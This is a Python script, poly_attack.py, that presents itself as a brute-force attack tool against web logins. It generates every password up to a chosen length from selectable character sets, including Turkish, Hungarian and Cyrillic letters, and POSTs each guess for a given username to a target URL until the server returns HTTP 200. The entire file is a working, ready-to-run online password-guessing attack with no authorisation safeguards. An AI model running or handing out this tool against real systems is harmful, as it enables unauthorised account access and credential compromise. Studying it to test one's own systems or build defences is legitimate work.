#!/usr/bin/env python3
"""
================================================================================
File:        poly_attack.py
Description: Polymorphic (multi-alphabet) brute-force attack tool
             Combines multiple character sets including extended alphabets
             (Turkish, Hungarian, Cyrillic) for internationalized attacks
Parameters:  --target <URL>, --user <username>, --digits, --lower, --upper,
             --symbols, --turkish, --hungarian, --cyrillic, --max-len <int>,
             --delay <float>, --force
Author:      Erik Buser
Date:        2025-10-28
================================================================================
"""

import argparse
import itertools
import sys
import time
import requests
import string


def build_alphabet(args):
    """Build alphabet from flags. Returns string of characters."""
    parts = []
    if args.digits:
        parts.append(string.digits)
    if args.lower:
        parts.append(string.ascii_lowercase)
    if args.upper:
        parts.append(string.ascii_uppercase)
    if args.symbols:
        parts.append("!@#$%^&*()_+-=[]{}|;:',.<>?/")
    if args.turkish:
        # Turkish specific: ç, ğ, ı, ö, ş, ü (lowercase and uppercase)
        parts.append("çğıöşüÇĞİÖŞÜ")
    if args.hungarian:
        # Hungarian specific: á, é, í, ó, ö, ő, ú, ü, ű (lowercase and uppercase)
        parts.append("áéíóöőúüűÁÉÍÓÖŐÚÜŰ")
    if args.cyrillic:
        # Cyrillic alphabet (Russian): а-я, А-Я
        parts.append("абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ")
    
    if not parts:
        print("[!] No alphabet selected. Use at least one flag (--digits, --lower, --upper, --symbols, --turkish, --hungarian, --cyrillic)", file=sys.stderr)
        sys.exit(2)
    
    return "".join(parts)


def calculate_total_candidates(alphabet_size, max_len):
    """Calculate total number of candidates for given alphabet size and max length."""
    total = 0
    for length in range(1, max_len + 1):
        total += alphabet_size ** length
    return total


def try_post(url, payload, timeout=5.0, max_retries=3):
    """POST JSON payload to url with retries. Returns response or None."""
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            return r
        except requests.RequestException as e:
            if attempt == max_retries:
                print(f"[!] Request failed after {attempt} attempts: {e}")
                return None
            else:
                time.sleep(backoff)
                backoff *= 2
    return None


def main():
    parser = argparse.ArgumentParser(description="Polymorphic brute-force tool with combinable alphabets")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--digits", action="store_true", help="Include digits (0-9)")
    parser.add_argument("--lower", action="store_true", help="Include lowercase letters (a-z)")
    parser.add_argument("--upper", action="store_true", help="Include uppercase letters (A-Z)")
    parser.add_argument("--symbols", action="store_true", help="Include common symbols")
    parser.add_argument("--turkish", action="store_true", help="Include Turkish characters (ç, ğ, ı, ö, ş, ü)")
    parser.add_argument("--hungarian", action="store_true", help="Include Hungarian characters (á, é, í, ó, ö, ő, ú, ü, ű)")
    parser.add_argument("--cyrillic", action="store_true", help="Include Cyrillic alphabet (Russian)")
    parser.add_argument("--max-len", type=int, default=4, help="Maximum password length to try")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay in seconds between attempts")
    parser.add_argument("--force", action="store_true", help="Skip warning for large search spaces")
    args = parser.parse_args()

    alphabet = build_alphabet(args)
    total = calculate_total_candidates(len(alphabet), args.max_len)

    print(f"[+] Alphabet: {repr(alphabet[:50])}{'...' if len(alphabet) > 50 else ''}")
    print(f"[+] Alphabet size: {len(alphabet)}; Max length: {args.max_len}")
    print(f"[+] Total candidates: {total:,}")

    # Warn if search space is very large
    if total > 1_000_000 and not args.force:
        print(f"\n[!] WARNING: Search space is very large ({total:,} candidates)")
        print("[!] This may take a very long time. Consider:")
        print("    - Reducing --max-len")
        print("    - Using fewer alphabet flags")
        print("    - Using --force to skip this warning")
        response = input("\nContinue anyway? [y/N]: ")
        if response.lower() != "y":
            print("Aborted by user")
            return 1

    tried = 0
    start = time.time()

    try:
        for length in range(1, args.max_len + 1):
            for tup in itertools.product(alphabet, repeat=length):
                pwd = "".join(tup)

                payload = {"username": args.user, "password": pwd}
                r = try_post(args.target, payload)
                tried += 1

                if r is None:
                    print(f"[-] Request failed for candidate '{pwd}', skipping")
                else:
                    if r.status_code == 200:
                        elapsed = time.time() - start
                        print(f"FOUND: {pwd} (tried {tried:,} candidates in {elapsed:.1f}s)")
                        return 0
                    else:
                        if tried % 100 == 0:
                            elapsed = time.time() - start
                            rate = tried / elapsed if elapsed > 0 else 0
                            print(f"[i] Tried {tried:,} candidates, last='{pwd}', rate={rate:.1f}/s, elapsed={elapsed:.1f}s")

                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130

    elapsed = time.time() - start
    print(f"Not found (tried {tried:,} candidates in {elapsed:.1f}s)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
